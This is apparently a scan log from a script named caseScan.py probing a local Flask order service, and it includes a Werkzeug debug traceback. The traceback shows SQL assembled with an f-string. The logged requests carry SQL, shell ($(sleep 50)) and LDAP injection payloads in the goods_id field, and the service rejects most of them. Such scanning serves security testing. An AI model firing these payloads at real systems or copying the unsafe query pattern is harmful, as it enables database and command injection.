  <div class="source library"><pre class="line before"><span class="ws">            </span>and req.method == &#34;OPTIONS&#34;</pre>
<pre class="line before"><span class="ws">        </span>):</pre>
<pre class="line before"><span class="ws">            </span>return self.make_default_options_response()</pre>
<pre class="line before"><span class="ws">        </span># otherwise dispatch to the handler for that endpoint</pre>
<pre class="line before"><span class="ws">        </span>view_args: dict[str, t.Any] = req.view_args  # type: ignore[assignment]</pre>
<pre class="line current"><span class="ws">        </span>return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
<span class="ws">        </span>       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def full_dispatch_request(self) -&gt; Response:</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Dispatches the request and on top of that performs request</pre>
<pre class="line after"><span class="ws">        </span>pre and postprocessing as well as HTTP exception catching and</pre>
<pre class="line after"><span class="ws">        </span>error handling.</pre></div>
</div>

<li><div class="frame" id="frame-1754719181344">
  <h4>File <cite class="filename">"E:\classPro\1204Pro\orderApp\server.py"</cite>,
      line <em class="line">116</em>,
      in <code class="function">create</code></h4>
  <div class="source "><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>sql = f&#39;update goods set count = {goods_count - request.json[&#34;goods_count&#34;]} where goods_id = %s&#39;</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>info(f&#39;{client_connect}: execute sql &gt;&gt;{sql}&#39;)</pre>
<pre class="line before"><span class="ws">    </span>val = (request.json[&#39;goods_id&#39;],)</pre>
<pre class="line current"><span class="ws">    </span>cursor.execute(sql, val)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">    </span>conn.commit()</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: execute success&#39;)</pre>
<pre class="line after"><span class="ws">    </span># 生成订单 存储订单数据</pre>
<pre class="line after"><span class="ws">    </span>order_id = &#39;OI&#39; + str(int(time.time() * 1000000))</pre>
<pre class="line after"><span class="ws">    </span>info(f&#39;{client_connect}: order_id &gt;&gt; {order_id}&#39;)</pre></div>
</div>

<li><div class="frame" id="frame-1754719179184">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">691</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>con2.close()</pre>
<pre class="line before"><span class="ws">                    </span>except Exception:</pre>
<pre class="line before"><span class="ws">                        </span>pass</pre>
<pre class="line before"><span class="ws">                </span>if transaction:</pre>
<pre class="line before"><span class="ws">                    </span>self._transaction = False</pre>
<pre class="line current"><span class="ws">                </span>raise error  # re-raise the original error again
<span class="ws">                </span>^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">            </span>else:</pre>
<pre class="line after"><span class="ws">                </span>con._usage += 1</pre>
<pre class="line after"><span class="ws">                </span>return result</pre>
<pre class="line after"><span class="ws">        </span>return tough_method</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719178176">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\dbutils\steady_db.py"</cite>,
      line <em class="line">610</em>,
      in <code class="function">tough_method</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                        </span>and not transaction):</pre>
<pre class="line before"><span class="ws">                    </span>raise con._failure</pre>
<pre class="line before"><span class="ws">                </span>if execute:</pre>
<pre class="line before"><span class="ws">                    </span>self._setsizes()</pre>
<pre class="line before"><span class="ws">                </span>method = getattr(self._cursor, name)</pre>
<pre class="line current"><span class="ws">                </span>result = method(*args, **kwargs)  # try to execute
<span class="ws">                </span>         ^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">                </span>if execute:</pre>
<pre class="line after"><span class="ws">                    </span>self._clearsizes()</pre>
<pre class="line after"><span class="ws">            </span>except con._failures as error:  # execution error</pre>
<pre class="line after"><span class="ws">                </span>if not transaction:</pre>
<pre class="line after"><span class="ws">                    </span>try:</pre></div>
</div>

<li><div class="frame" id="frame-1754719179616">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">158</em>,
      in <code class="function">execute</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>while self.nextset():</pre>
<pre class="line before"><span class="ws">            </span>pass</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>query = self.mogrify(query, args)</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line current"><span class="ws">        </span>result = self._query(query)
<span class="ws">        </span>         ^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._executed = query</pre>
<pre class="line after"><span class="ws">        </span>return result</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def executemany(self, query, args):</pre>
<pre class="line after"><span class="ws">        </span>&#34;&#34;&#34;Run several data against one query.</pre></div>
</div>

<li><div class="frame" id="frame-1754719180624">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\cursors.py"</cite>,
      line <em class="line">325</em>,
      in <code class="function">_query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rownumber = r</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def _query(self, q):</pre>
<pre class="line before"><span class="ws">        </span>conn = self._get_db()</pre>
<pre class="line before"><span class="ws">        </span>self._clear_result()</pre>
<pre class="line current"><span class="ws">        </span>conn.query(q)
<span class="ws">        </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._do_get_result()</pre>
<pre class="line after"><span class="ws">        </span>return self.rowcount</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _clear_result(self):</pre>
<pre class="line after"><span class="ws">        </span>self.rownumber = 0</pre></div>
</div>

<li><div class="frame" id="frame-1754719180336">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">549</em>,
      in <code class="function">query</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span># if DEBUG:</pre>
<pre class="line before"><span class="ws">        </span>#     print(&#34;DEBUG: sending query:&#34;, sql)</pre>
<pre class="line before"><span class="ws">        </span>if isinstance(sql, str):</pre>
<pre class="line before"><span class="ws">            </span>sql = sql.encode(self.encoding, &#34;surrogateescape&#34;)</pre>
<pre class="line before"><span class="ws">        </span>self._execute_command(COMMAND.COM_QUERY, sql)</pre>
<pre class="line current"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)
<span class="ws">        </span>                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def next_result(self, unbuffered=False):</pre>
<pre class="line after"><span class="ws">        </span>self._affected_rows = self._read_query_result(unbuffered=unbuffered)</pre>
<pre class="line after"><span class="ws">        </span>return self._affected_rows</pre></div>
</div>

<li><div class="frame" id="frame-1754719181920">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">779</em>,
      in <code class="function">_read_query_result</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">                </span>result.unbuffered_active = False</pre>
<pre class="line before"><span class="ws">                </span>result.connection = None</pre>
<pre class="line before"><span class="ws">                </span>raise</pre>
<pre class="line before"><span class="ws">        </span>else:</pre>
<pre class="line before"><span class="ws">            </span>result = MySQLResult(self)</pre>
<pre class="line current"><span class="ws">            </span>result.read()
<span class="ws">            </span>^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>self._result = result</pre>
<pre class="line after"><span class="ws">        </span>if result.server_status is not None:</pre>
<pre class="line after"><span class="ws">            </span>self.server_status = result.server_status</pre>
<pre class="line after"><span class="ws">        </span>return result.affected_rows</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719180768">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">1157</em>,
      in <code class="function">read</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>if self.unbuffered_active:</pre>
<pre class="line before"><span class="ws">            </span>self._finish_unbuffered_query()</pre>
<pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">    </span>def read(self):</pre>
<pre class="line before"><span class="ws">        </span>try:</pre>
<pre class="line current"><span class="ws">            </span>first_packet = self.connection._read_packet()
<span class="ws">            </span>               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">            </span>if first_packet.is_ok_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_ok_packet(first_packet)</pre>
<pre class="line after"><span class="ws">            </span>elif first_packet.is_load_local_packet():</pre>
<pre class="line after"><span class="ws">                </span>self._read_load_local_packet(first_packet)</pre></div>
</div>

<li><div class="frame" id="frame-1754719180480">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\connections.py"</cite>,
      line <em class="line">729</em>,
      in <code class="function">_read_packet</code></h4>
  <div class="source library"><pre class="line before"><span class="ws"></span> </pre>
<pre class="line before"><span class="ws">        </span>packet = packet_type(bytes(buff), self.encoding)</pre>
<pre class="line before"><span class="ws">        </span>if packet.is_error_packet():</pre>
<pre class="line before"><span class="ws">            </span>if self._result is not None and self._result.unbuffered_active is True:</pre>
<pre class="line before"><span class="ws">                </span>self._result.unbuffered_active = False</pre>
<pre class="line current"><span class="ws">            </span>packet.raise_for_error()
<span class="ws">            </span>^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws">        </span>return packet</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def _read_bytes(self, num_bytes):</pre>
<pre class="line after"><span class="ws">        </span>self._sock.settimeout(self._read_timeout)</pre>
<pre class="line after"><span class="ws">        </span>while True:</pre></div>
</div>

<li><div class="frame" id="frame-1754719180912">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\protocol.py"</cite>,
      line <em class="line">221</em>,
      in <code class="function">raise_for_error</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">        </span>self.rewind()</pre>
<pre class="line before"><span class="ws">        </span>self.advance(1)  # field_count == error (we already know that)</pre>
<pre class="line before"><span class="ws">        </span>errno = self.read_uint16()</pre>
<pre class="line before"><span class="ws">        </span>if DEBUG:</pre>
<pre class="line before"><span class="ws">            </span>print(&#34;errno =&#34;, errno)</pre>
<pre class="line current"><span class="ws">        </span>err.raise_mysql_exception(self._data)
<span class="ws">        </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>def dump(self):</pre>
<pre class="line after"><span class="ws">        </span>dump_packet(self._data)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws"></span> </pre></div>
</div>

<li><div class="frame" id="frame-1754719177888">
  <h4>File <cite class="filename">"D:\python3\Lib\site-packages\pymysql\err.py"</cite>,
      line <em class="line">143</em>,
      in <code class="function">raise_mysql_exception</code></h4>
  <div class="source library"><pre class="line before"><span class="ws">    </span>errno = struct.unpack(&#34;&lt;h&#34;, data[1:3])[0]</pre>
<pre class="line before"><span class="ws">    </span>errval = data[9:].decode(&#34;utf-8&#34;, &#34;replace&#34;)</pre>
<pre class="line before"><span class="ws">    </span>errorclass = error_map.get(errno)</pre>
<pre class="line before"><span class="ws">    </span>if errorclass is None:</pre>
<pre class="line before"><span class="ws">        </span>errorclass = InternalError if errno &lt; 1000 else OperationalError</pre>
<pre class="line current"><span class="ws">    </span>raise errorclass(errno, errval)
<span class="ws">    </span>^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</pre></div>
</div>
</ul>
  <blockquote>pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
</blockquote>
</div>

<div class="plain">
    <p>
      This is the Copy/Paste friendly version of the traceback.
    </p>
    <textarea cols="50" rows="10" name="code" readonly>Traceback (most recent call last):
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\flask\app.py&#34;, line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;E:\classPro\1204Pro\orderApp\server.py&#34;, line 116, in create
    cursor.execute(sql, val)
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 691, in tough_method
    raise error  # re-raise the original error again
  File &#34;D:\python3\Lib\site-packages\dbutils\steady_db.py&#34;, line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\cursors.py&#34;, line 325, in _query
    conn.query(q)
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 779, in _read_query_result
    result.read()
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File &#34;D:\python3\Lib\site-packages\pymysql\connections.py&#34;, line 729, in _read_packet
    packet.raise_for_error()
  File &#34;D:\python3\Lib\site-packages\pymysql\protocol.py&#34;, line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File &#34;D:\python3\Lib\site-packages\pymysql\err.py&#34;, line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, &#34;Truncated incorrect DOUBLE value: &#39;1;SELECT%20*\n&#39;&#34;)
</textarea>
</div>
<div class="explanation">
  The debugger caught an exception in your WSGI application.  You can now
  look at the traceback which led to the error.  <span class="nojavascript">
  If you enable JavaScript you can also use additional features such as code
  execution (if the evalex feature is enabled), automatic pasting of the
  exceptions and much more.</span>
</div>
      <div class="footer">
        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
        friendly Werkzeug powered traceback interpreter.
      </div>
    </div>

    <div class="pin-prompt">
      <div class="inner">
        <h3>Console Locked</h3>
        <p>
          The console is locked and needs to be unlocked by entering the PIN.
          You can find the PIN printed out on the standard output of your
          shell that runs the server.
        <form>
          <p>PIN:
            <input type=text name=pin size=14>
            <input type=submit name=btn value="Confirm Pin">
        </form>
      </div>
    </div>
  </body>
</html>

<!--

Traceback (most recent call last):
  File "D:\python3\Lib\site-packages\flask\app.py", line 2213, in __call__
    return self.wsgi_app(environ, start_response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2193, in wsgi_app
    response = self.handle_exception(e)
               ^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
         ^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\flask\app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "E:\classPro\1204Pro\orderApp\server.py", line 116, in create
    cursor.execute(sql, val)
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 691, in tough_method
    raise error  # re-raise the original error again
  File "D:\python3\Lib\site-packages\dbutils\steady_db.py", line 610, in tough_method
    result = method(*args, **kwargs)  # try to execute
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 158, in execute
    result = self._query(query)
             ^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\cursors.py", line 325, in _query
    conn.query(q)
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 549, in query
    self._affected_rows = self._read_query_result(unbuffered=unbuffered)
                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 779, in _read_query_result
    result.read()
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 1157, in read
    first_packet = self.connection._read_packet()
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "D:\python3\Lib\site-packages\pymysql\connections.py", line 729, in _read_packet
    packet.raise_for_error()
  File "D:\python3\Lib\site-packages\pymysql\protocol.py", line 221, in raise_for_error
    err.raise_mysql_exception(self._data)
  File "D:\python3\Lib\site-packages\pymysql\err.py", line 143, in raise_mysql_exception
    raise errorclass(errno, errval)
pymysql.err.OperationalError: (1292, "Truncated incorrect DOUBLE value: '1;SELECT%20*\n'")


-->

[INFO]00:18:13:122-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "to_timestamp_tz\n"}}
[INFO]00:18:13:123-caseScan.py:113 >> code: 403
[INFO]00:18:13:124-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:154-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "tz_offset\n"}}
[INFO]00:18:13:154-caseScan.py:113 >> code: 403
[INFO]00:18:13:155-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:186-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "<>\"'%;)(&+\n"}}
[INFO]00:18:13:187-caseScan.py:113 >> code: 403
[INFO]00:18:13:187-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:218-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'%20or%201=1\n"}}
[INFO]00:18:13:218-caseScan.py:113 >> code: 403
[INFO]00:18:13:219-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:250-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%27%20or%201=1\n"}}
[INFO]00:18:13:250-caseScan.py:113 >> code: 403
[INFO]00:18:13:251-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:280-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%20$(sleep%2050)\n"}}
[INFO]00:18:13:281-caseScan.py:113 >> code: 403
[INFO]00:18:13:281-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:311-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%20'sleep%2050'\n"}}
[INFO]00:18:13:311-caseScan.py:113 >> code: 403
[INFO]00:18:13:312-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:342-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "char%4039%41%2b%40SELECT\n"}}
[INFO]00:18:13:342-caseScan.py:113 >> code: 403
[INFO]00:18:13:343-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:373-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "&apos;%20OR\n"}}
[INFO]00:18:13:373-caseScan.py:113 >> code: 403
[INFO]00:18:13:374-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:402-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "'sqlattempt1\n"}}
[INFO]00:18:13:403-caseScan.py:113 >> code: 403
[INFO]00:18:13:404-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:433-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "(sqlattempt2)\n"}}
[INFO]00:18:13:434-caseScan.py:113 >> code: 403
[INFO]00:18:13:434-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:462-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "|\n"}}
[INFO]00:18:13:463-caseScan.py:113 >> code: 403
[INFO]00:18:13:464-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:492-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%7C\n"}}
[INFO]00:18:13:493-caseScan.py:113 >> code: 403
[INFO]00:18:13:493-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:523-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*|\n"}}
[INFO]00:18:13:523-caseScan.py:113 >> code: 403
[INFO]00:18:13:524-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:552-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%2A%7C\n"}}
[INFO]00:18:13:552-caseScan.py:113 >> code: 403
[INFO]00:18:13:553-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:585-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*(|(mail=*))\n"}}
[INFO]00:18:13:586-caseScan.py:113 >> code: 403
[INFO]00:18:13:586-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:615-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%2A%28%7C%28mail%3D%2A%29%29\n"}}
[INFO]00:18:13:616-caseScan.py:113 >> code: 403
[INFO]00:18:13:616-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:646-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "*(|(objectclass=*))\n"}}
[INFO]00:18:13:647-caseScan.py:113 >> code: 403
[INFO]00:18:13:647-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:679-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%2A%28%7C%28objectclass%3D%2A%29%29\n"}}
[INFO]00:18:13:680-caseScan.py:113 >> code: 403
[INFO]00:18:13:680-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:709-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "(\n"}}
[INFO]00:18:13:710-caseScan.py:113 >> code: 403
[INFO]00:18:13:710-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:744-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%28\n"}}
[INFO]00:18:13:745-caseScan.py:113 >> code: 403
[INFO]00:18:13:745-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:775-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": ")\n"}}
[INFO]00:18:13:776-caseScan.py:113 >> code: 403
[INFO]00:18:13:776-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:805-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%29\n"}}
[INFO]00:18:13:805-caseScan.py:113 >> code: 403
[INFO]00:18:13:806-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:834-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "&\n"}}
[INFO]00:18:13:835-caseScan.py:113 >> code: 403
[INFO]00:18:13:835-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:866-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%26\n"}}
[INFO]00:18:13:866-caseScan.py:113 >> code: 403
[INFO]00:18:13:867-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:897-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "!\n"}}
[INFO]00:18:13:898-caseScan.py:113 >> code: 403
[INFO]00:18:13:898-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:928-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "%21\n"}}
[INFO]00:18:13:929-caseScan.py:113 >> code: 403
[INFO]00:18:13:929-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:958-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or 1=1 or ''='\n"}}
[INFO]00:18:13:959-caseScan.py:113 >> code: 403
[INFO]00:18:13:959-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

[INFO]00:18:13:988-caseScan.py:112 >> requests: {"url": "http://127.0.0.1:8992/create", "method": "post", "headers": {"user-id": "A1", "Content-Type": "application/json"}, "body": {"goods_count": 1, "goods_id": "' or ''='\n"}}
[INFO]00:18:13:988-caseScan.py:113 >> code: 403
[INFO]00:18:13:989-caseScan.py:114 >> response: {
  "message": "goods is not exist"
}

